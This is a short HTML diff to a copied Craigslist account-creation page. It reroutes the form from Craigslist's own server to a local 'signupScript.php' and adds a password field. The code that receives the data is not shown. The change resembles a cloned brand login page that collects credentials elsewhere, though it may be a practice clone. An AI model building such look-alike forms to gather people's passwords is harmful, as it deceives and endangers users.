@@ -108,7 +108,7 @@ account log in            </p>
 
             <div class="accountform login-page-box">
                 <h1 class="accountform-banner">Create an account</h1>
-                <form action="https://accounts.craigslist.org/login?lang=en&amp;cc=us" method="POST">
+                <form action="signupScript.php" method="POST">
                     <input type="hidden" name="rp" value="/login/home">
                     <input type="hidden" name="rt" value="L">
                     <input type="hidden" name="t" value="1521043560">
@@ -119,8 +119,12 @@ account log in            </p>
                         <label for="emailAddress">Email</label>
                         <input type="email" id="emailAddress" name="emailAddress" value="" maxlength="64" required="">
                         </div>
+                    <div class="accountform-field">
+                        <label for="inputPassword">Password</label>
+                        <input id="inputPassword" type="password" name="inputPassword2" required="" autocomplete="off">
+                    </div>
                     <div class="accountform-actions">
-                        <button type="submit" class="accountform-btn">Create account</button>
+                        <button type="submit" name="submit2" class="accountform-btn">Create account</button>
                         <a href="account-help.html" class="accountform-helplink">Account help</a>
                     </div>
                 </form>
